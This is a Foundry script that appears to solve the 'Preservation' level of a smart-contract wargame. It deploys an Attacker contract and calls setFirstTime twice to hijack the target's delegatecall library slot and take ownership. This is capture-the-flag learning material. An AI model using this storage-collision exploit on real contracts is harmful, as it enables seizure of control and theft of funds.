// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {Attacker} from "./../src/16-Preservation/Attacker.sol";

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
    function owner() external view returns (address);
    function timeZone1Library() external view returns (address);
}

contract DeployAttacker is Script {
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attacker attacker = new Attacker();
        vm.stopBroadcast();
    }
}

contract DeployAttack is Script {
    address public constant TARGET_ADDRESS = 0x6bD8B1695f46AD98b2A6b7836721887d665CBAF6;
    IPreservation target = IPreservation(TARGET_ADDRESS);

    address public constant ATTACKER_ADDRESS = 0xf45A8e60f07E7AB73bB78f5906DCD5a9B1d529B6;
    Attacker attackerContract = Attacker(ATTACKER_ADDRESS); //deployed Attacker


    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        target.setFirstTime(uint256(uint160(ATTACKER_ADDRESS)));
        target.setFirstTime(0);
        vm.stopBroadcast();
    }
}